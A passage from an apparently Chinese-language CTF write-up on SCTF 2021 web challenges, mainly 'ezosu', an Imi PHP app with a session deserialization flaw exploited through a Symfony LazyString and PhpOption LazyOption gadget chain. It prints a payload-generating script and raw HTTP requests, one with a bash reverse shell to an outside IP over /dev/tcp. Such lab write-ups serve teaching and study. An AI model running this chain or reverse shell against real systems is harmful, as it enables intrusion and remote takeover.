class="string">&#x27;flag&#123;&#x27;</span>):])</span><br></pre></td></tr></table></figure>

<p>构造恶意序列化代码覆盖session文件,访问index.php触发反序列化</p>
<p><img src="2021122621/image-20211231233538503.png" alt="image-20211231233538503"></p>
<p>这里记录一下写脚本时遇到的坑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http头的Cookie中有两个长得很像的PHPSESS:</span><br><span class="line">PHPSESSION</span><br><span class="line">	php服务器给每名用户下发的会话session</span><br><span class="line">PHPSESSID</span><br><span class="line">	session.name 指定会话名以用做 cookie 的名字。只能由字母数字组成，默认为 PHPSESSID。</span><br><span class="line">	SESSION文件常以sess_PHPSESSID命名</span><br></pre></td></tr></table></figure>



<h2 id="ezosu"><a href="#ezosu" class="headerlink" title="ezosu"></a>ezosu</h2><p>该题给了部分源码,需要我们起个docker环境,将容器中的文件copy到本地进行分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d # 起docker环境</span><br><span class="line">docker ps # 记录containerID</span><br><span class="line">docker copy &lt;containerID&gt;:/app ./app  # 复制文件到本地</span><br></pre></td></tr></table></figure>

<p>进入题目网址,不断测试功能,在设置中抓到一个可疑的包</p>
<p><img src="2021122621/image-20211228220201763.png" alt="image-20211228220201763"></p>
<p>重放进行分析,对/config接口进行post,在源码中找到对应文件</p>
<p><img src="2021122621/image-20211228221436125.png" alt="image-20211228221436125"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app\ApiServer\Controller\IndexController.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ImiApp</span>\<span class="title">ApiServer</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">App</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Db</span>\<span class="title">Db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Redis</span>\<span class="title">Redis</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">Http</span>\<span class="title">Controller</span>\<span class="title">HttpController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">Http</span>\<span class="title">Route</span>\<span class="title">Annotation</span>\<span class="title">Action</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">Http</span>\<span class="title">Route</span>\<span class="title">Annotation</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">Http</span>\<span class="title">Route</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">View</span>\<span class="title">Annotation</span>\<span class="title">HtmlView</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">View</span>\<span class="title">Annotation</span>\<span class="title">View</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Imi</span>\<span class="title">Server</span>\<span class="title">Session</span>\<span class="title">Session</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Controller</span>(&quot;/&quot;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HttpController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Action</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Route</span>(&quot;/&quot;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response-&gt;redirect(<span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Action</span></span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;request-&gt;getMethod();</span><br><span class="line">        <span class="variable">$res</span> = [</span><br><span class="line">            <span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;ok&quot;</span>,</span><br><span class="line">            <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;200&quot;</span>,</span><br><span class="line">            <span class="string">&quot;value&quot;</span> =&gt; <span class="literal">true</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$method</span> === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">            Session::clear();</span><br><span class="line">            <span class="variable">$configData</span> = <span class="keyword">$this</span>-&gt;request-&gt;getParsedBody();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$configData</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                Session::set(<span class="variable">$k</span>, <span class="variable">$v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$configData</span> = Session::get();</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$configData</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="variable">$res</span>[<span class="string">&quot;value&quot;</span>] = <span class="variable">$configData</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$res</span> = [</span><br><span class="line">                    <span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;Not Find&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;404&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;value&quot;</span> =&gt; <span class="literal">null</span></span><br><span class="line">                ];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$res</span> = [</span><br><span class="line">                <span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;Unsupported method&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;405&quot;</span>,</span><br><span class="line">                <span class="string">&quot;value&quot;</span> =&gt; <span class="literal">false</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在config路由下可以进行session存取操作,post方法可以将数据序列化后存入session中,get方法可以从session文件中取出数据进行反序列化后展示出来</p>
<p>进入docker查看session文件,确实是将数据序列化后存入的</p>
<p><img src="2021122621/image-20211229123816928.png" alt="image-20211229123816928"></p>
<p>GET方法展示数据</p>
<p><img src="2021122621/image-20211229123403488.png" alt="image-20211229123403488"></p>
<p>既然存在反序列化,是否能够利用该点</p>
<p>这里进行测试:</p>
<p>更改post中的数据,插入<code>hackhack|i:123456789</code>,在/config的get方法中查看结果</p>
<p><code>&quot;dim&quot;:60  =&gt;  &quot;d|i:1;hackhack|i:123456789;im&quot;:60,</code></p>
<p><img src="2021122621/image-20211229124319616.png" alt="image-20211229124319616"></p>
<p><img src="2021122621/image-20211229124344527.png" alt="image-20211229124344527"></p>
<p>可以看到我们插入的恶意序列化代码被成功反序列化,并被展示出来</p>
<p>有了反序列化触发点,下面开始找pop链</p>
<p>进入到<code>app/vendor</code>目录下,我们可以看到存在<code>symfony</code>目录,没错这个题目也引入了<code>symfony/string</code>依赖,说明我们还可以利用上几个题目的漏洞点</p>
<p>再进入到<code>app\vendor\phpoption\phpoption\src\PhpOption</code>有一个LazyOption.php文件,下面截取部分代码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyOption.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpOption</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Traversable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@template</span> T</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@extends</span> Option&lt;T&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyOption</span> <span class="keyword">extends</span> <span class="title">Option</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> callable(mixed...):(Option&lt;T&gt;) */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> array&lt;int, mixed&gt; */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$arguments</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Option&lt;T&gt;|null */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$option</span>; </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option()-&gt;isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option()-&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">option</span>(<span class="params"></span>): <span class="title">Option</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;option) &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> mixed */</span></span><br><span class="line">            <span class="variable">$option</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;callback, <span class="keyword">$this</span>-&gt;arguments);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$option</span> <span class="keyword">instanceof</span> Option) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;option = <span class="variable">$option</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(sprintf(<span class="string">&#x27;Expected instance of %s&#x27;</span>, Option::class));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到option()方法中存在参数可控的call_user_func_array方法调用,而在上面的成员方法isEmpty()以及get()等等都可以调用option()方法</p>
<p>再利用上一个题目的分析,我们可以得到pop链:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化</span><br><span class="line">-&gt;字符串处理</span><br><span class="line">-&gt;LazyString#__toString()</span><br><span class="line">-&gt;LazyOption#isEmpty()</span><br><span class="line">-&gt;LazyOption#option()</span><br><span class="line">-&gt;命令执行</span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import os,requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8001&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;rxxxx&#x27;</span>&#125;</span><br><span class="line">proxy_test = requests.get(url, proxies=proxy, cookies=cookie)</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;</span><span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">namespace Symfony\Component\String&#123;</span></span><br><span class="line"><span class="string">    class LazyString&#123;</span></span><br><span class="line"><span class="string">        private $value;</span></span><br><span class="line"><span class="string">        public function __construct($value)&#123;</span></span><br><span class="line"><span class="string">            $this-&gt;value = $value;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace PhpOption&#123;</span></span><br><span class="line"><span class="string">    abstract class Option&#123;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    final class LazyOption extends Option&#123;</span></span><br><span class="line"><span class="string">        private $option = null;</span></span><br><span class="line"><span class="string">        private $callback;</span></span><br><span class="line"><span class="string">        private $arguments;</span></span><br><span class="line"><span class="string">        public function __construct()&#123;</span></span><br><span class="line"><span class="string">            $this-&gt;callback = &quot;system&quot;;</span></span><br><span class="line"><span class="string">            $this-&gt;arguments = array(&quot;touch /tmp/flag&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string">    use Symfony\Component\String\LazyString;</span></span><br><span class="line"><span class="string">    $array = array(new PhpOption\LazyOption(),&quot;get&quot;);</span></span><br><span class="line"><span class="string">    $lazy = new LazyString($array);</span></span><br><span class="line"><span class="string">    print_r(json_encode(serialize($lazy)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;exp.php&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code)</span><br><span class="line">seri = os.popen(<span class="string">&#x27;php exp.php&#x27;</span>).read()</span><br><span class="line">os.popen(<span class="string">&#x27;del exp.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = f<span class="string">&quot;d|&quot;</span> + seri.strip(<span class="string">&#x27;&quot;&#x27;</span>) + <span class="string">&quot;im&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;[debug] payload is: &#x27;</span> + payload)</span><br></pre></td></tr></table></figure>

<p>提交payload,拿到PHPSESSION</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /config HTTP/1.1</span><br><span class="line">Host: localhost:7777</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost:7777/settings.html</span><br><span class="line">content-type: application/json</span><br><span class="line">Origin: http://localhost:7777</span><br><span class="line">Content-Length: 404</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: bdshare_firstime=1619663076819; XDEBUG_SESSION=XDEBUG_ECLIPSE; PHPSESSID=6a1c7378948498b4bed170d212bac7ee; __tins__713776=%7B%22sid%22%3A%201619663076391%2C%20%22vd%22%3A%208%2C%20%22expires%22%3A%201619665600834%7D; __51cke__=; __51laig__=12; _csrf=3067fb78f9b1447deb7a6307b8d9fa8fe35a0d13fefa00fe1c90ba7513aa9e08a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%224QLk0PKtqpkSXhwRmTv5HBysJPEuE2zl%22%3B%7D; __tins__17754207=%7B%22sid%22%3A%201624533245364%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201624535118910%7D; isvipretainend=; vipPromorunningtmr=; discount_free_trigger=; token=s%3Aj%3A%7B%22id%22%3A1%2C%22username%22%3A%22tefuir%22%2C%22password%22%3A%22this_is_password%22%7D.SdGCWHkxHMFX8LEOhXG2%2FZR6UwoxLbXmh%2FxdcI%2FWq0s; lg=cn; PbootSystem=bpvv29memg47vqoe3jmv62tjdp; session=5243527576976910940%7ChrQTOaK93YFVBrjGnVzRrngHQNZQIRah30IP9aGRTOuSoeGDZ.FEixAK6PshBIiQ5ovaqlbP3gljneaCnu8AC1; _ga=GA1.1.946040824.1641209883; _gid=GA1.1.1662565044.1641209883; _gat_gtag_UA_169262247_1=1</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&quot;b&quot;,&quot;d|O:35:\&quot;Symfony\\Component\\String\\LazyString\&quot;:1:&#123;s:42:\&quot;\u0000Symfony\\Component\\String\\LazyString\u0000value\&quot;;a:2:&#123;i:0;O:20:\&quot;PhpOption\\LazyOption\&quot;:3:&#123;s:28:\&quot;\u0000PhpOption\\LazyOption\u0000option\&quot;;N;s:30:\&quot;\u0000PhpOption\\LazyOption\u0000callback\&quot;;s:6:\&quot;system\&quot;;s:31:\&quot;\u0000PhpOption\\LazyOption\u0000arguments\&quot;;a:1:&#123;i:0;s:15:\&quot;touch \/tmp\/flag\&quot;;&#125;&#125;i:1;s:3:\&quot;get\&quot;;&#125;&#125;im&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="2021122621/image-20220103212325315.png" alt="image-20220103212325315"></p>
<p>带上PHPSESSION去访问/config接口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /config HTTP/1.1</span><br><span class="line">Host: localhost:7777</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost:7777/settings.html</span><br><span class="line">content-type: application/json</span><br><span class="line">Origin: http://localhost:7777</span><br><span class="line">Content-Length: 445</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: bdshare_firstime=1619663076819; XDEBUG_SESSION=XDEBUG_ECLIPSE; PHPSESSID=6a1c7378948498b4bed170d212bac7ee; __tins__713776=%7B%22sid%22%3A%201619663076391%2C%20%22vd%22%3A%208%2C%20%22expires%22%3A%201619665600834%7D; __51cke__=; __51laig__=12; _csrf=3067fb78f9b1447deb7a6307b8d9fa8fe35a0d13fefa00fe1c90ba7513aa9e08a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%224QLk0PKtqpkSXhwRmTv5HBysJPEuE2zl%22%3B%7D; __tins__17754207=%7B%22sid%22%3A%201624533245364%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201624535118910%7D; isvipretainend=; vipPromorunningtmr=; discount_free_trigger=; token=s%3Aj%3A%7B%22id%22%3A1%2C%22username%22%3A%22tefuir%22%2C%22password%22%3A%22this_is_password%22%7D.SdGCWHkxHMFX8LEOhXG2%2FZR6UwoxLbXmh%2FxdcI%2FWq0s; lg=cn; PbootSystem=bpvv29memg47vqoe3jmv62tjdp; session=5243527576976910940%7ChrQTOaK93YFVBrjGnVzRrngHQNZQIRah30IP9aGRTOuSoeGDZ.FEixAK6PshBIiQ5ovaqlbP3gljneaCnu8AC1; _ga=GA1.1.946040824.1641209883; _gid=GA1.1.1662565044.1641209883; _gat_gtag_UA_169262247_1=1; PHPSESSION=2fda02d69a7294604d60af2ea07551fd</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&quot;b&quot;,&quot;d|O:35:\&quot;Symfony\\Component\\String\\LazyString\&quot;:1:&#123;s:42:\&quot;\u0000Symfony\\Component\\String\\LazyString\u0000value\&quot;;a:2:&#123;i:0;O:20:\&quot;PhpOption\\LazyOption\&quot;:3:&#123;s:28:\&quot;\u0000PhpOption\\LazyOption\u0000option\&quot;;N;s:30:\&quot;\u0000PhpOption\\LazyOption\u0000callback\&quot;;s:6:\&quot;system\&quot;;s:31:\&quot;\u0000PhpOption\\LazyOption\u0000arguments\&quot;;a:1:&#123;i:0;s:53:\&quot;bash -c &#x27;bash -i &gt;&amp; \/dev\/tcp\/101.43.35.153\/8889 0&gt;&amp;1&#x27;\&quot;;&#125;&#125;i:1;s:3:\&quot;get\&quot;;&#125;&#125;;im&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="2021122621/image-20220103212446155.png" alt="image-20220103212446155"></p>
<p>命令执行结果</p>
<p><img src="2021122621/image-20220103212510386.png" alt="image-20220103212510386"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://team-su.github.io/passages/2021-12-25-SCTF/">https://team-su.github.io/passages/2021-12-25-SCTF/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FUMO-on-the-Christmas-tree"><span class="toc-number">1.</span> <span class="toc-text">FUMO_on_the_Christmas_tree</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOFTP"><span class="toc-number">2.</span> <span class="toc-text">GOFTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loginme"><span class="toc-number">3.</span> <span class="toc-text">Loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rceme"><span class="toc-number">4.</span> <span class="toc-text">Rceme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-it"><span class="toc-number">5.</span> <span class="toc-text">Upload_it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-it2"><span class="toc-number">6.</span> <span class="toc-text">Upload_it2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezosu"><span class="toc-number">7.</span> <span class="toc-text">ezosu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2021/12/26/2021122621/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
